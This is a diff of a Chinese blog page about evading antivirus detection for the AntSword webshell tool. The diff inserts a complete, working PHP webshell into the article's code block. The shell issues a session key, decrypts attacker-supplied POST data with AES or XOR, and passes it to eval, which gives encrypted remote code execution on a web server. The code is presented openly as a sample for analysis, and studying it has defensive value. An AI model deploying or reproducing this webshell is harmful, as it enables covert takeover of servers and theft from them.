@@ -34,7 +34,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/yzddmr6.com\/posts\/antsword-xor-encoder\/"
-        },"genre": "posts","keywords": "免杀, 中国蚁剑","wordcount":  2469 ,
+        },"genre": "posts","keywords": "免杀, 中国蚁剑","wordcount":  2541 ,
         "url": "https:\/\/yzddmr6.com\/posts\/antsword-xor-encoder\/","datePublished": "2019-10-15T09:43:37+00:00","dateModified": "2019-10-15T09:43:37+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -160,7 +160,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
                 </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2469 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2541 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -199,14 +199,74 @@
 <p>看一下他的shell.php是怎么写的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
-</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
-</span></span><span class="line"><span class="cl">?&gt;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">key</span><span class="o">=</span><span class="n">substr</span><span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">uniqid</span><span class="p">(</span><span class="n">rand</span><span class="p">())),</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">&#39;k&#39;</span><span class="p">]</span><span class="o">=$</span><span class="n">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="o">$</span><span class="n">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">key</span><span class="o">=$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">&#39;k&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="o">$</span><span class="n">post</span><span class="o">=</span><span class="n">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">extension_loaded</span><span class="p">(</span><span class="s1">&#39;openssl&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="o">$</span><span class="n">t</span><span class="o">=</span><span class="s2">&#34;base64_&#34;</span><span class="o">.</span><span class="s2">&#34;decode&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="o">$</span><span class="n">post</span><span class="o">=$</span><span class="n">t</span><span class="p">(</span><span class="o">$</span><span class="n">post</span><span class="o">.</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">		<span class="k">for</span><span class="p">(</span><span class="o">$</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="o">$</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="o">$</span><span class="n">post</span><span class="p">);</span><span class="o">$</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    			 <span class="o">$</span><span class="n">post</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">$</span><span class="n">post</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="p">]</span><span class="o">^$</span><span class="n">key</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="o">$</span><span class="n">post</span><span class="o">=</span><span class="n">openssl_decrypt</span><span class="p">(</span><span class="o">$</span><span class="n">post</span><span class="p">,</span> <span class="s2">&#34;AES128&#34;</span><span class="p">,</span> <span class="o">$</span><span class="n">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">arr</span><span class="o">=</span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">post</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="k">func</span><span class="o">=$</span><span class="n">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">params</span><span class="o">=$</span><span class="n">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="n">C</span><span class="p">{</span><span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(</span><span class="o">$</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">p</span><span class="o">.</span><span class="s2">&#34;&#34;</span><span class="p">);}}</span>
+</span></span><span class="line"><span class="cl">	<span class="err">@</span><span class="n">new</span> <span class="n">C</span><span class="p">(</span><span class="o">$</span><span class="n">params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>注意看这一段</p>
